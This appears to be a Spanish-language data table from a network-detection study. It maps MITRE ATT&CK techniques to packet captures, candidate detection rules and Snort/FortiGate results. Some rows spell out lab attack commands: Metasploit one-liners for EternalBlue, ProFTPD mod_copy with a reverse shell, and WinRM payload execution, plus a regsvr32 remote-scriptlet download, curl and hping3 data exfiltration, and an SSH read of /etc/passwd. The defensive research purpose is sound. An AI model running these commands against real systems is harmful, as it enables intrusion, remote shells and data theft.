Reconnaissance;-;TA0043;Active Scanning;T1595;Vulnerability Scanning;T1595.002;Escaneo de vulnerabilidades;nmap;T1595.002-Port_Scanning_[3].pcapng;1;1000;0;SI;Regla genérica que detecte el envío de paquetes TCP con flag SYN activado a varios puertos diferentes;Ejecución de comando nmap para escaneo de puertos y detección de vulnerabilidades (nmap -sV --script vulscan IP);Manual [3] / 3.8.2;Manual [3] / 3.8.2.4;Manual [3] / 3.8.2.5;1;1;0;1;0;1;1;0.00;48;0.05;49;0.05;53;0.05;"""El ataque consiste en la ejecución de un comando nmap que escanea los 1000 puertos más comunes. Snort detecta que se esta realizando un analisis con nmap de puertos (SID 2009358) . Además, detecta posibles escaneo en diferentes rangos de puertos. Ejemplo: SID 2002910. Para el caso de FortiGate, sólo saltan 19 alertas, cada una avisando de un intento de descubrimiento de puerto particular""";19;0.02;1
Command and Control;-;TA0040;Data Encoding;T1132;Standard Encoding;T1132.001;Codificacion de mensajes entre la victima y el C2 Server mediante Base64;"""Metasploit, curl, base64""";T1132.001_Standard_Encoding_[5].pcapng;;1;0;NO;Deteccion por anomalias;Servidor HTTP en el C2 Server. Intercambio de mensajes entre la victima y atacante mediante base64;Manual [5] / 3.5.8.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Remote Access Software;T1219;-;-;Uso de TeamViewer para establecer canal de comunicación alternativo;TeamViewer;"""T1219-RemoteAccessSoftwareLocal_[5].pcapng, T1219-RemoteAccessSoftwareNAT_[5].pcapng""";;1;0;NO;"""Deteccion por listas negras/anomalías. Monitorizar tráfico de red correspondiente a softwares de acesso remoto(AnyDesk, TeamViewer...)""";Conexion mediante TeamViewer entre dos equipos;Manual [5] / 3.5.8.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Dynamic Resolution;T1568;Fast Flux DNS;T1568.001;Esconder un C2 Server mediante un servidor DNS con bajo TTL y modo Fast Flux;"""bind, Metasploit""";T1568-fastFluxDNS_[5].pcapng;;1;0;NO;Deteccion por anomalias o listas negras;"Servidor DNS ""Round Robin""";Manual [5] / 3.5.8.4;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;-;TA0040;Hide Infrastructure;T1665;-;-;Esconder el servidor C2 utilizando un Proxy;"""Metasploit, HTTP Server""";T1665-Hide_Infrastructure_[5].pcapng;;1;0;NO**;"""Detección por reglas/anomalías. Resulta importante monitorizar tráfico de red con destino a dominios incluidos en listas negras, conexiones a equpos externos…""";Esconder el servidor C2 utilizando un proxy;Manual [5] / 3.5.8.5;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Command and Control;-;TA0040;Protocol Tunneling;T1572;-;-;Tunelizar la conexión al C2 Server mediante SSH;"""SSH, Metasploit""";T1572-Protocol_Tunneling_[5].pcapng;;1;0;NO;"""Deteccion por anomalías, monitorizando la creacion de nuevas conexiones""";Tunelizar una conexion mediante SSH;Manual [5] / 3.5.8.6;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;0
Command and Control;-;TA0040;Encrypted Channel;T1573;Assymetric Cryptography;T1573.002;Encriptar conexion con C2 Server;"""Metasploit, OpenSSL""";T1573.002_AssymetricCryptography_[5].pcapng;;1;0;NO**;"""Deteccion por anomalías, monitorizando la creacion de nuevas conexiones""";Encriptar conexion al C2 Server;Manual [5] / 3.5.8.7;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Command and Control;-;TA0040;Non-Standard Port;T1571;-;-;Sesión SSH en puerto 2200;ssh;T1571-SSH_[2].pcapng;;1;0;NO;-;Establecer una sesion SSH sobre un puerto no estandar. Comando: sshpass -p salas ssh salas@192.168.2.2 -p 2200 cat /etc/passwd;Manual [2] / 3.1.9.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Command and Control;"""Defense Evasion, Persistence""";TA0040;Traffic Signaling;T1205;Port Knocking;T1205.001;Esconder y activar un puerto de forma remota;Knockd;T1205.001-Port_Knocking_[3].pcapng;;1;0;NO;-;"""Ocultar y activar un puerto remotamente, haciendo primero peticiones a ciertos puertos de forma secuencial. Comando: knock -v 172.16.2.2 7000 8000 9000""";Manual [3] / 3.8.11;Manual [3] / 3.8.11.4;Manual [3] / 3.8.11.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Indicator Removal;T1070;Network Share Connection Removal;T1070.005;Eliminación de conexiones establecidas via Network Share en Windows;Comando Net Use;T1070-Indicator_removal_network_share_connection_removal_[4].pcapng;;1;0;NO;Detección por anomalías basada en desconexión repentina procedente de una dirección de varios recursos compartidos;-;Manual [4] / 3.8;Manual [4] / B.8;Manual [4] / 4.8;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Modify Registry;T1112;-;-;Modificación del Registro de forma remota;reg (Remoto);T1112-Modify_registry_[4].pcapng;;1;0;SI;Regla que detecte el envío de mensajes con protocolo WINREG o Remote Registry Service;-;Manual [4] / 3.9;Manual [4] / B.9;Manual [4] / 4.9;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Defense Evasion;-;TA0005;Rogue Domain Controller;T1207;-;-;DCShadow: registro de un DC fraudulento para habilitar la manipulación de datos en un entorno Active Directory;mimikazt;T1207-Rogue_domain_controller_[4].pcapng;;1;0;SI;Regla que detecte una llamada a la función DRSUAPI_REPLICA_ADD (5);-;Manual [4] / 3.10;Manual [4] / B.10;Manual [4] / 4.10;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Defense Evasion;-;TA0005;System Binary Proxy Execution;T1218;Regsvr32;T1218.010;Ejecución de COM scriptlet remoto;Regsvr32.exe;T1218.010-COM_Scriptlet_[2].pcapng;;1;0;NO;-;"""Aprovechar vulnerabilidad regsvr32.exe descargando y ejecutando scripts y librerias evadiendo controles de seguridad Windows. Comando: C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll""";Manual [2] / 3.3.1.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Template Injection;T1221;-;-;Inyectar un fichero mediante Phishing .docx con macros modificadas que permita pasar desapercibido;Sitios web convencionales (Gmail);T1221-Template_Injection_[5].pcapng;;1;0;NO**;"""Detección por lista negra/anomalías. Debería monitorizarse y detectar tráfico de red hacia direcciones o dominios marcados en listas negras. En algún caso concreto, se puede descargar y ejecutar malware por lo que se debe monitorizar y detectar la descarga de este tipo de ficheros""";"""Modificación de fichero .docx para, mediante macros, provocar la descarga y ejecución de malware en el equipo víctima""";Manual [5] / 3.5.4.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Defense Evasion;-;TA0005;Network Boundary Bridging;T1599;NAT Traversal;T1599.001;Modificación de políticas de red para permitir tráfico externo a la red interna;iptables;"""T1599-NBB1_[5].pcapng, T1599-NBB2_[5].pcapng""";;1;0;NO;Deteccion por anomalías;Equipo intermedio entre red interna de la víctima y el atacante con firewall. El atacante con acceso a este equipo intermedio modifica las reglas del firewall iptables para permitir su tráfico.;Manual [5] / 3.5.4.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Network Boundary Bridging;T1599;-;-;Salto de VLAN;ip;T1599-Salto_vlan_[1].pcapng;;1;0;NO;"""Detección por anomalías y estudio de topología de red, que detecte posibles vulnerabilidades relacionadas con el etiquetado apilable 802.1Q""";-;Manual [1] / 3.2.1;Manual [1] / E.4;;1;1;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Defense Evasion;-;TA0005;Build Image on Host;T1612;-;-;Creacion y montado de un contenedor con un servidor SSH sobre un equipo previamente vulnerado;"""DockerAPI, SSH""";"""T1612-BuildImageOnHostLocal_[5].pcapng, T1612-BuildImageOnHostNAT_[5].pcapng""";;1;0;SI;Regla genérica que detecte descargas de contenedores mediante Docker API;Construir contenedor sobre el equipo víctima para evitar ser detectados.;Manual [5] / 3.5.4.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Lateral Movement;-;TA0008;Remote Services;T1021;SSH;T1021.004;Sesión SSH;SSH;T1021-remote_services_ssh_[3].pcapng;;1;0;SI;;-;;;;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;;;
Lateral Movement;-;TA0008;Exploitation of Remote Services;T1210;-;-;EternalBlue;Metasploit;T1210-Eternal_blue_[2].pcapng;;1;0;SI;Regla genérica que detecte uso de EternalBlue;"""Uso de exploit Eternalblue para obtener movimiento lateral y establecimiento de meterpreter. Comando: msfconsole -x ""use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; run -z; sessions -c getuid; sessions -k 1; exit""""";Manual [2] / 3.1.7.1;Manual [4] / B.29;Manual [2] / 4.1.1.4;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Lateral Movement;-;TA0008;Exploitation of Remote Services;T1210;-;-;Ataque Web;"""DVWA, In-house selenium framework""";T1210-Web_attack-C2018_[6].pcapng;;1;0;NO;-;-;Dataset CIC-2018;Manual [4] / B.36;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Lateral Movement;-;TA0008;Exploitation of Remote Services;T1210;-;-;Ejecución de código remoto basado en vulnerabilidades de servidor FTP;Metasploit;T1210-Remote_code_execution_[2].pcapng;;1;0;SI;Regla genérica que detecte intento de ejecucion remota de codigo en servidor FTP;"Uso de comandos SITE/CPFR/CPTO en la version 1.3.5 de ProFTPD que permite copiar ficheros a cualquier usuario no autenticado. Comando: msfconsole -x ""use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.2.2; set SITEPATH /var/www/html; set LHOST 192.168.1.3; set LPORT 4444; set payload cmd/unix/reverse_perl; run -z; sessions -c ls; sessions -k 1; exit""";Manual [2] / 3.1.7.2;Manual [4] / B.30;Manual [2] / 4.2.1.9;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;1;1.00;1
Lateral Movement;-;TA0008;Remote Service Session Hijacking;T1563;RDP Hijacking;T1563.002;Secuestro de sesión RDP mediante tscon.exe;tscon.exe;T1563.002_RDPHijacking_[5].pcapng;;1;0;SI;Regla genérica para detectar conexiones RDP entre un orígen y un servidor o destino;"""Uso de Windows Server 2012 R2 con DNS, Active Directory y Servicio de Escritorio Remoto""";Manual [5] / 3.5.7.1;Manual [5];;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Lateral Movement;-;TA0008;Lateral Tool Transfer;T1570;-;-;Transferencia de herramientas para la continuación del ataque entre máquinas utilizando protocolos de compartición de archivos;Metasploit;T1570-Lateral_Tool_Transfer_[5].pcapng;;1;0;SI;"""Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.""";Transferencia mediante FTP de ficheros entre dos equipos;Manual [5] / 3.5.7.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Lateral Movement;-;TA0008;Internal Spear-phishing;T1534;-;-;Phishing interno entre equipos pertenecientes a un dominio con servidor de correo habilitado;"""MailEnabler, Thunderbird""";T1534-Internal_spearphishing_[4].pcapng;;1;0;NO;"""Detección por anomalías, análisis de la estructura de correos electrónicos, petición de información confidencial, etc""";-;Manual [4] / 3.14;Manual [4] / B.14;Manual [4] / 4.14;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Discovery;-;TA0007;Network Service Discovery;T1046;-;-;Descubrimiento de servicios y version;Nikto;T1046-Version_services_detection1_[3].pcapng;;6270;0;SI;"""Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)""";-;Manual [3] / 3.8.3;Manual [3] / 3.8.3.4;Manual [3] / 3.8.3.5;1;1;0;1;0;1;0;0.00;48;0.01;48;0.01;73;0.01;"""Existen 6270 rutas diferentes en el escaneo de rutas. Es decir, 6270 mensajes HTTP GET. Snort detecta el uso de Nikto para el escaneo web y detecta el acceso a diferentes rutas y intentos de diferentes ataques (Ejemplo SID 2009325) que no se corresponden con el ataque realizado. En FortiGate hay que descartar las alertas relacionadas con la herramienta usada, por lo que detectan 208 instancias de ataque""";208;0.03;1
Discovery;-;TA0007;Network Service Discovery;T1046;-;-;Descubrimiento de servicios y version;nmap;T1046-Version_services_detection2_[3].pcapng;;65536;0;SI;"""Múltiples mecanismos. Por ejemplo, regla que detecte un escaneo de puertos (alto número de peticiones hacia un rango de puertos en poco tiempo)""";-;Manual [3] / 3.8.3;Manual [3] / 3.8.3.4;Manual [3] / 3.8.3.5;1;1;0;1;0;0;3;0.00;49;0.00;49;0.00;51;0.00;"""Se realiza un escaneo completo de puertos. Snort detecta el escaneo de puertos mediante los SID 2009358 detectando el uso de nmap. Además, detecta el escaneo de diferentes rangos de puertos como el SID 2002910. FortiGate sólo detecta el descubrimiento de puertos relacionados con el servicio HTTP""";4;0.00;1
Discovery;-;TA0007;Network Service Discovery;T1046;-;-;DDos + Escaneo de puertos;"""Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests""";T1046-C2018_[6].pcapng;;1;0;NO**;"""En determinadas circunstancias, si el envío de paquetes constituye una amenaza de denegación de servicio, podría detectarse el envío masivo de paquetes""";-;Dataset CIC-2018;Manual [4] / B.31;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;1;1.00;1
Discovery;-;TA0007;Remote System Discovery;T1018;-;-;Descubrimiento de servicios y puertos;nmap;T1018-service_discovery_[3].pcapng;;1000;0;SI;Regla que detecte envío de mútliples peticiones a un rango de puertos en un tiempo determinado;-;Manual [3] / 3.8.1;Manual [3] / 3.8.1.4;Manual [3] / 3.8.1.5;1;1;0;1;0;1;0;0.00;44;0.04;44;0.04;44;0.04;"""En este ataque se realiza el escaneo de 1000 puertos. Sin embargo, no se detecta el uso de nmap y solo se detectan los rangos de puertos 5900-5920 y 5800-5820 (SIDS 2002911 2002910) y los puertos 3306,1433,1521,5432. FortiGate sólo detecta este ataque para 6 puertos concretos""";6;0.01;1
Discovery;-;TA0007;Group Policy Discovery;T1615;-;-;Comandos mediante Powershell para obtener información sobre configuraciones de políticas de grupo;PowerShell;T1615-Group_Policy_Discovery_[5].pcapng;;41;0;NO;Detección por anomalías;Ejecución de comandos mediante Powershell para comprobar políticas de grupo;Manual [5] / 3.5.6.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;Misma consulta realizada muchas veces repetida;0;0.00;0
Discovery;-;TA0007;System Owner;T1033;-;-;Descubrimiento de sesión de usuario en equipo remoto;"""quser, qwinsta""";T1033-System_owner_[4].pcapng;;1;0;SI;Regla que detecte múltiples interacciones con la API LSM_API_service del servicio RPC desde el mismo equipo origen.;-;Manual [4] / 3.12;Manual [4] / B.12;Manual [4] / 4.12;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Discovery;-;TA0007;Domain Trust Discovery;T1482;-;-;Descubrimiento de dominios de confianza en entorno Active Directory;dsquery;T1482-Domain_trust_discovery_[4].pcapng;;1;0;NO*;"""Regla personalizada que detecte paquetes LDAP, procedentes de equipos que no son DC en la red (configurable manualmente) y con la cadena objectClass=trustedDomain""";-;Manual [4] / 3.13;Manual [4] / B.13;Manual [4] / 4.13;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Exfiltration;-;TA0010;Exfiltration Over Alternative Protocol;T1048;Exfiltration Over Unencrypted Non-C2 Protocol;T1048.003;Exfiltración por ICMP;hping3;T1048.003-Exfiltration_over_ICMP_[2].pcapng;;16;0;SI;Regla genérica que detecte PING inusual.;"""Exfiltracion mediante protocolo ICMP. Envia varios echo Request que contienen como datos el contenido de ese fichero. Comando: echo ""Esto es un exfiltración sobre ICMP"" > file;timeout 15s hping3 --file ./file --data 36 192.168.2.2 --icmp""";Manual [2] / 3.2.2.1;Manual [4] / B.27;Manual [2] / 4.2.2.2;1;1;0;1;0;1;16;1.00;16;1.00;16;1.00;16;1.00;El mismo mensaje ICMP es enviado varias veces repetido. Snort detecta el envio inusual de PING (SID 29456);0;0.00;1
Exfiltration;-;TA0010;Exfiltration Over Alternative Protocol;T1048;Exfiltration Over Unencrypted Non-C2 Protocol;T1048.003;Exfiltración por FTP;Caldera;T1048.003-Exfiltration_over_FTP_[3].pcapng;;1;0;NO;-;"""Exfiltracion de datos utilizando el protocolo FTP. Utilizando caldera y la operacion Advanced Thief. Comando: curl -T stage_to_steal.tar.gz.gpg ftp://172.16.1.2/VictimDirectory/ --user ""dit:dit""""";Manual [3] / 3.8.15;Manual [3] / 3.8.15.4;Manual [3] / 3.8.15.5;1;1;0;1;0;0;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;0
Exfiltration;-;TA0010;Exfiltration Over Other Network Medium;T1011;Exfiltration Over Bluetooth;T1011.001;Extracción via Bluetooth;"""Covenant, btobex, Bluetooth""";T1011-Exfiltration_over_bluetooth_[4].pcapng;;1;0;NO;Detección por anomalías en red Bluetooth. Envío y/o recepción de información comprometida por la red Bluetooth;-;Manual [4] / 3.23;Manual [4] / B.23;Manual [4] / 4.23;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Automated Exfiltration;T1020;Traffic Duplication;T1020.001;Ejecución de script en Python para activar el reenvío de paquetes en el equipo víctima;"""SSH, Scapy""";T1020.001-Automated_exfiltration_traffic_duplication_[4].pcapng;;1;0;NO;Detección por anomalías en red que detecte el envío duplicado de paquetes procedentes de un mismo origen interno a la organización;-;Manual [4] / 3.24;Manual [4] / B.24;Manual [4] / 4.24;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Scheduled Transfer;T1029;-;-;Comunicación C2 para el establecimiento de extracción programada;"""Covenant, Powershell""";T1029-Scheduled_transfer_[4].pcapng;;1;1;NO;"""Detección por anomalías, basada en el descubrimiento de eventos programados que no han sido creados por el usuario.""";-;Manual [4] / 3.25;Manual [4] / B.25;Manual [4] / 4.25;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Data Transfer Size Limits;T1030;-;-;Dividir archivos para realizar transferencias menores a un umbral que provoque alertas;"""ftp, split""";T1030-Transfer_Size_Limits_[5].pcapng;;1;0;NO**;"""Dependiendo la forma en la que se envien los archivos, puede ser indetectable. Sin embargo, si utiliza protocolos de transferencia de ficheros (FTP,SMB...) resulta importante monitorizar transferencias con un mismo tamaño de manera concurrente""";"""Transferencia de ficheros mediante FTP, previamente divididos en paquetes de un tamaño constante""";Manual [5] / 3.5.9.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Exfiltration;-;TA0010;Transfer Data to Cloud Account;T1537;-;-;Transferir archivos de una cuenta a otra mediante un servicio en la nube;OneDrive;T1537-Transfer_Data_to_Cloud_Account_[5].pcapng;;1;0;NO;Deteccion por listas negras/anomalías;Transferir entre dos cuentas en la nube unos ficheros;Manual [5] / 3.5.9.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Exfiltration Over C2 Channel;T1041;-;-;Exfiltración por canal C2;Caldera;T1041-exfiltration_over_c2_channel_[3].pcapng;;1;0;NO;Detección por anomalías basada en la sospecha de una extracción de información confidencial por un posible canal C2;-;Manual [3] / 3.8.14;Manual [3] / 3.8.14.4;Manual [3] / 3.8.14.5;1;1;0;1;0;0;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Exfiltration;-;TA0010;Exfiltration over Web Service;T1567;Exfiltration to Cloud Storage;T1567.002;Exfiltrar datos de un equipo a la nube;Google Drive;T1567.002-Exfiltration_To_Cloud_Storage_[5].pcapng;;1;0;NO;Deteccion por listas negras/anomalías;Transferir ficheros de un equipo a la nube;Manual [5] / 3.5.9.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Execution;-;TA0002;User Execution;T1204;Malicious Link;T1204.001;Enlace malicioso;wget;T1204.001-malicious_link_[3].pcapng;;1;0;NO;Deteccion por listas negras/anomalías;Redireccion al pinchar en un enlace a un sitio malicioso. Comando : wget http://172.16.1.2 (Desde la víctima);Manual [3] / 3.8.17;Manual [3] / 3.8.17.4;Manual [3] / 3.8.17.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Execution;-;TA0002;Windows Management Instrumentation;T1047;-;-;Ejecución de carga por WinRM;Metasploit;T1047-WinRM_[2].pcapng;;1;0;SI;Regla genérica que detecte intento de ejecucion de código shell en un equipo;"""Ejecucion de payload en un equipo mediante WinRM. Comando: msfconsole -x ""use exploit/windows/winrm/winrm_script_exec; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; set LPORT 5555; set username administrator; set password vagrant; set force_vbs true; run -z; sessions -c 'cmdkey /list'; sessions -k 1; exit""""";Manual [2] / 3.1.4.1;Manual [4] / B.26;Manual [2] / 4.2.1.5;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Execution;-;TA0002;Exploitation for Client Execution;T1203;-;-;Ataque con Botnet;"""Ares, Screenshot and key logging""";T1203-C2018_[6].pcapng;;1;0;NO;-;-;Dataset CIC-2018;Dataset CIC-2018;Manual [4] / B.35;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Execution;-;TA0002;System Services;T1569;Service Execution;T1569.002;Ejecución de un Servicio / Fichero Ejecutable de manera remota;PsExec;T1569-System_services_service_execution_[4].pcapng;;1;0;SI;"""Existen múltiples métodos de detección. Como ejemplos:
 Regla que detecte la cadena “PSEXESVC” en el contenido de mensajes SMBv2
 Regla que detecte archivos ejecutables en mensajes SMB
""";-;Manual [4] / 3.6;Manual [4] / B.6;Manual [4] / 4.6;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
